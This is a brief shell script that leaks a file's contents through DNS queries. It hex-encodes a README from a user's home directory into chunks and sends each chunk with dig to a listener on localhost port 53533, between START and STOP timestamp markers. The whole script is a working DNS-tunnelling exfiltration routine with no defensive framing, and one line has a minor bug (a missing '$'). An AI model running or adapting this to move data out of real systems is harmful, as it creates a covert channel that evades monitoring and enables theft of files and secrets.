#!/bin/sh

# File to emit

file_path=/home/anthony/Davidson/uncle-dav/uncle-dav-back/README.md
file_name=$(basename file_path)

timestamp=$(date +%s)
dig @localhost -p 53533 "START $timestamp" > /dev/null


xxd -ps -c 16 "$file_path" | while read hex; do
  dig @localhost -p 53533 "$hex" > /dev/null
done

dig @localhost -p 53533 "STOP $timestamp" > /dev/null
